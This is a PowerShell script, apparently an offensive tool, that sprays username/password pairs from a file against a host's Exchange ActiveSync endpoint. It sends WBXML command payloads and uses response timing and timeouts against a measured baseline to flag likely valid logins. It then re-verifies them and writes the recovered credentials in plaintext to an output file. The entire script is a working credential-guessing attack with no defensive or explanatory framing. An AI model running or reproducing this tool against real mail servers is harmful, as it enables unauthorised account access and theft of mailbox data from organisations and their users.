[CmdletBinding(DefaultParameterSetName = "File")]
param(
    # -- Mode 1: File mode (multiple credentials) --
    [Parameter(Mandatory = $true, ParameterSetName = "File")]
    [string]$CredFile,
    
    # Optional switch to skip Phase 2 final verification.
    [Parameter(Mandatory = $false, ParameterSetName = "File")]
    [switch]$SkipFinal,
    
    # -- Mode 2: Single credential check --
    [Parameter(Mandatory = $true, ParameterSetName = "Single")]
    [string]$Username,
    [Parameter(Mandatory = $false, ParameterSetName = "Single")]
    [string]$Password,
    
    # Common parameters:
    [Parameter(Mandatory = $true)]
    [string]$Hostname,
    
    [Parameter(Mandatory = $false)]
    [ValidateSet("Ping", "Options", "FolderSync")]
    [string]$CmdType = "Ping",
    
    # Optional quick timeout threshold in seconds.
    # In File mode, if not supplied, a baseline is computed.
    [Parameter(Mandatory = $false)]
    [double]$QuickTimeoutSec,
    
    # Final check timeout in seconds; defaults to 20 seconds.
    [double]$FinalTimeoutSec = 20,
    
    [Parameter(Mandatory = $true)]
    [string]$OutputFile,
    
    # Optional target domain to append if username doesn't already contain '@'
    [Parameter(Mandatory = $false)]
    [string]$Domain
)

# --- Prepare Output File ---
if (Test-Path $OutputFile) { Remove-Item $OutputFile -Force }
New-Item -ItemType File -Path $OutputFile -Force | Out-Null

# --- Function: Get-ActiveSyncPayload ---
function Get-ActiveSyncPayload {
    param( [string]$CmdType )
    switch ($CmdType.ToLower()) {
        "ping" {
            # Minimal Ping payload.
            # The 7th byte (0x0A) represents the heartbeat interval (10 sec).
            return [byte[]](0x03,0x01,0x6A,0x00,0x05,0x00,0x0A,0x00,0x00,0x00)
        }
        "options" {
            return [byte[]](0x03,0x01,0x6A,0x00,0x05,0x00,0x01,0x00,0x00,0x00)
        }
        "foldersync" {
            return [byte[]](0x03,0x01,0x6A,0x00,0x06,0x00,0x01,0x00,0x30,0x00,0x00,0x00)
        }
        default {
            Write-Output "Unsupported command type: $CmdType"
            exit
        }
    }
}

$Payload = Get-ActiveSyncPayload -CmdType $CmdType

# --- Mode: Single Credential Check ---
if ($PSCmdlet.ParameterSetName -eq "Single") {
    # Prompt for password if not supplied.
    if (-not $Password) {
        Write-Output "Password not provided; please enter password securely."
        $SecurePwd = Read-Host "Enter password" -AsSecureString
        $Credential = New-Object System.Management.Automation.PSCredential ($Username, $SecurePwd)
    }
    else {
        $SecurePwd = ConvertTo-SecureString $Password -AsPlainText -Force
        $Credential = New-Object System.Management.Automation.PSCredential ($Username, $SecurePwd)
    }
    if ($Domain -and ($Username -notmatch "@")) {
        $Username = "$Username@$Domain"
        $Credential = New-Object System.Management.Automation.PSCredential ($Username, $SecurePwd)
    }
    
    $Url = "https://$Hostname/Microsoft-Server-ActiveSync?Cmd=$CmdType"
    $Headers = @{ "Content-Type" = "application/vnd.ms-sync.wbxml"; "MS-ASProtocolVersion" = "14.0" }
    Write-Output ("Performing single credential check for {0}" -f $Username) | Tee-Object -FilePath $OutputFile
    $sw = [System.Diagnostics.Stopwatch]::StartNew()
    try {
        $response = Invoke-WebRequest -Uri $Url -Method Post -Headers $Headers -Body $Payload -Credential $Credential -TimeoutSec $FinalTimeoutSec -UseBasicParsing
        $sw.Stop()
        $msg = ("[+] Valid login: {0} - Cmd: {1}, Response: {2}, Runtime: {3} ms" -f $Username, $CmdType, $response.StatusCode, $sw.ElapsedMilliseconds)
        Write-Output $msg
        Add-Content -Path $OutputFile -Value $msg
    }
    catch {
        $sw.Stop()
        $errorMsg = $_.Exception.Message
        if ($errorMsg -match "timed out") {
            $msg = ("[+] Valid login (timeout): {0} - Cmd: {1}, Runtime: {2} ms" -f $Username, $CmdType, $sw.ElapsedMilliseconds)
            Write-Output $msg
            Add-Content -Path $OutputFile -Value $msg
        }
        elseif ($_.Exception.Response -and $_.Exception.Response.StatusCode.Value__ -eq 401) {
            $msg = ("[-] Failed login: {0} - Cmd: {1}, Runtime: {2} ms" -f $Username, $CmdType, $sw.ElapsedMilliseconds)
            Write-Output $msg
            Add-Content -Path $OutputFile -Value $msg
        }
        else {
            $msg = ("[!] Other error for {0} - Cmd: {1}, Error: {2}, Runtime: {3} ms" -f $Username, $CmdType, $errorMsg, $sw.ElapsedMilliseconds)
            Write-Output $msg
            Add-Content -Path $OutputFile -Value $msg
        }
    }
    return
}

# --- Mode: File-based Credential Check ---
# If no QuickTimeoutSec is supplied, perform baseline measurement.
if (-not $PSBoundParameters.ContainsKey("QuickTimeoutSec")) {
    Write-Output "No QuickTimeoutSec provided. Performing baseline measurement using 5 requests with random usernames..."
    $numRequests = 5
    $totalTimeMs = 0
    $charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    $charArray = $charset.ToCharArray()
    
    function Get-RandomString {
        param( [int]$min, [int]$max )
        $length = Get-Random -Minimum $min -Maximum ($max + 1)
        -join (1..$length | ForEach-Object { $charArray[(Get-Random -Minimum 0 -Maximum $charArray.Length)] })
    }
    
    for ($i = 1; $i -le $numRequests; $i++) {
        $randUser = Get-RandomString -min 6 -max 10
        $dummyPassword = "dummy"
        $SecureDummy = ConvertTo-SecureString $dummyPassword -AsPlainText -Force
        $dummyCred = New-Object System.Management.Automation.PSCredential ($randUser, $SecureDummy)
        $Url = "https://$Hostname/Microsoft-Server-ActiveSync?Cmd=$CmdType"
        $Headers = @{ "Content-Type" = "application/vnd.ms-sync.wbxml"; "MS-ASProtocolVersion" = "14.0" }
        $sw = [System.Diagnostics.Stopwatch]::StartNew()
        try {
            Invoke-WebRequest -Uri $Url -Method Post -Headers $Headers -Body $Payload -Credential $dummyCred -TimeoutSec 10 -UseBasicParsing | Out-Null
        }
        catch { }
        $sw.Stop()
        $totalTimeMs += $sw.ElapsedMilliseconds
        Write-Output ("Baseline measurement {0}: {1} ms" -f $i, $sw.ElapsedMilliseconds)
    }
    $avgTimeMs = $totalTimeMs / $numRequests
    # Compute twice the average (in seconds). If below 1 second, force it to 1 second; otherwise round up.
    $computedTimeoutSec = ($avgTimeMs * 2) / 1000.0
    if ($computedTimeoutSec -lt 1) {
        $computedTimeoutSec = 1
    }
    else {
        $computedTimeoutSec = [math]::Ceiling($computedTimeoutSec)
    }
    Write-Output ("Baseline average: {0} ms. Setting QuickTimeoutSec to {1} sec." -f $avgTimeMs, $computedTimeoutSec)
    $QuickTimeoutSec = $computedTimeoutSec
}

# --- Phase 1: Quick Check ---
$PotentialValid = @()
$FinalValid = @()

Write-Output ("=== Phase 1: Quick Check with timeout threshold of {0} sec ===" -f $QuickTimeoutSec) | Tee-Object -FilePath $OutputFile

Get-Content $CredFile | ForEach-Object {
    $line = $_.Trim()
    if ($line -eq "") { return }
    
    $tokens = $line -split "\s+"
    if ($tokens.Count -lt 2) {
        $msg = "Line '$line' is not in expected format 'username password'. Skipping..."
        Write-Warning $msg
        Add-Content -Path $OutputFile -Value $msg
        return
    }
    
    $credUsername = $tokens[0]
    if ($Domain -and ($credUsername -notmatch "@")) { $credUsername = "$credUsername@$Domain" }
    $credPassword = $tokens[1]
    
    $SecurePassword = ConvertTo-SecureString $credPassword -AsPlainText -Force
    $Credential = New-Object System.Management.Automation.PSCredential ($credUsername, $SecurePassword)
    $Url = "https://$Hostname/Microsoft-Server-ActiveSync?Cmd=$CmdType"
    $Headers = @{ "Content-Type" = "application/vnd.ms-sync.wbxml"; "MS-ASProtocolVersion" = "14.0" }
    
    $sw = [System.Diagnostics.Stopwatch]::StartNew()
    try {
        $response = Invoke-WebRequest -Uri $Url -Method Post -Headers $Headers -Body $Payload -Credential $Credential -TimeoutSec $QuickTimeoutSec -UseBasicParsing
        $sw.Stop()
        if ($sw.ElapsedMilliseconds -ge ($QuickTimeoutSec * 1000)) {
            $msg = ("[?] Potential valid login (long response): {0}:{1} - Cmd: {2}, Response: {3}, Runtime: {4} ms" -f $credUsername, $credPassword, $CmdType, $response.StatusCode, $sw.ElapsedMilliseconds)
            $PotentialValid += ,@{Username = $credUsername; Password = $credPassword}
        }
        else {
            $msg = ("[-] Failed login: {0}:{1} - Cmd: {2}, Response: {3}, Runtime: {4} ms" -f $credUsername, $credPassword, $CmdType, $response.StatusCode, $sw.ElapsedMilliseconds)
        }
        Write-Output $msg
        Add-Content -Path $OutputFile -Value $msg
    }
    catch {
        $sw.Stop()
        $errorMsg = $_.Exception.Message
        if ($errorMsg -match "timed out") {
            $msg = ("[?] Potential valid login (timeout): {0}:{1} - Cmd: {2}, Runtime: {3} ms" -f $credUsername, $credPassword, $CmdType, $sw.ElapsedMilliseconds)
            Write-Output $msg
            Add-Content -Path $OutputFile -Value $msg
            $PotentialValid += ,@{Username = $credUsername; Password = $credPassword}
        }
        elseif ($_.Exception.Response -and $_.Exception.Response.StatusCode.Value__ -eq 401) {
            $msg = ("[-] Failed login: {0}:{1} - Cmd: {2}, Runtime: {3} ms" -f $credUsername, $credPassword, $CmdType, $sw.ElapsedMilliseconds)
            Write-Output $msg
            Add-Content -Path $OutputFile -Value $msg
        }
        else {
            $msg = ("[!] Other error for {0}:{1} - Cmd: {2}, Error: {3}, Runtime: {4} ms" -f $credUsername, $credPassword, $CmdType, $errorMsg, $sw.ElapsedMilliseconds)
            Write-Output $msg
            Add-Content -Path $OutputFile -Value $msg
        }
    }
}

# --- Phase 2: Final Check ---
# If -SkipFinal is specified, we skip Phase 2.
if (-not $SkipFinal) {
    Write-Output ("=== Phase 2: Final Check with timeout of {0} sec ===" -f $FinalTimeoutSec) | Tee-Object -FilePath $OutputFile -Append
    foreach ($cred in $PotentialValid) {
        $u = $cred.Username
        $p = $cred.Password
        $SecurePassword = ConvertTo-SecureString $p -AsPlainText -Force
        $Credential = New-Object System.Management.Automation.PSCredential ($u, $SecurePassword)
        $Url = "https://$Hostname/Microsoft-Server-ActiveSync?Cmd=$CmdType"
        $Headers = @{ "Content-Type" = "application/vnd.ms-sync.wbxml"; "MS-ASProtocolVersion" = "14.0" }
        $sw = [System.Diagnostics.Stopwatch]::StartNew()
        try {
            $response = Invoke-WebRequest -Uri $Url -Method Post -Headers $Headers -Body $Payload -Credential $Credential -TimeoutSec $FinalTimeoutSec -UseBasicParsing
            $sw.Stop()
            $msg = ("[+] Final valid login: {0}:{1} - Cmd: {2}, Response: {3}, Runtime: {4} ms" -f $u, $p, $CmdType, $response.StatusCode, $sw.ElapsedMilliseconds)
            Write-Output $msg
            Add-Content -Path $OutputFile -Value $msg
            $FinalValid += ,@{Username = $u; Password = $p}
        }
        catch {
            $sw.Stop()
            $errorMsg = $_.Exception.Message
            if ($errorMsg -match "timed out") {
                $msg = ("[+] Final valid login (timeout): {0}:{1} - Cmd: {2}, Runtime: {3} ms" -f $u, $p, $CmdType, $sw.ElapsedMilliseconds)
                Write-Output $msg
                Add-Content -Path $OutputFile -Value $msg
                $FinalValid += ,@{Username = $u; Password = $p}
            }
            elseif ($_.Exception.Response -and $_.Exception.Response.StatusCode.Value__ -eq 401) {
                $msg = ("[-] Final check failed (401): {0}:{1} - Cmd: {2}, Runtime: {3} ms" -f $u, $p, $CmdType, $sw.ElapsedMilliseconds)
                Write-Output $msg
                Add-Content -Path $OutputFile -Value $msg
            }
            else {
                $msg = ("[!] Final check error for {0}:{1} - Cmd: {2}, Error: {3}, Runtime: {4} ms" -f $u, $p, $CmdType, $errorMsg, $sw.ElapsedMilliseconds)
                Write-Output $msg
                Add-Content -Path $OutputFile -Value $msg
            }
        }
    }
}
else {
    Write-Output "Skipping Phase 2 final verification as requested." | Tee-Object -FilePath $OutputFile -Append
}

# --- Summary ---
Write-Output "=== Summary ===" | Tee-Object -FilePath $OutputFile -Append
if ($SkipFinal) {
    # In SkipFinal mode, list potential valid credentials from Phase 1.
    if ($PotentialValid.Count -gt 0) {
        foreach ($cred in $PotentialValid) {
            $msg = ("[+] Potential valid: {0}:{1}" -f $cred.Username, $cred.Password)
            Write-Output $msg
            Add-Content -Path $OutputFile -Value $msg
        }
    }
    else {
        $msg = "No potential valid credentials found."
        Write-Output $msg
        Add-Content -Path $OutputFile -Value $msg
    }
}
else {
    if ($FinalValid.Count -gt 0) {
        foreach ($cred in $FinalValid) {
            $msg = ("[+] Valid: {0}:{1}" -f $cred.Username, $cred.Password)
            Write-Output $msg
            Add-Content -Path $OutputFile -Value $msg
        }
    }
    else {
        $msg = "No valid credentials found."
        Write-Output $msg
        Add-Content -Path $OutputFile -Value $msg
    }
}
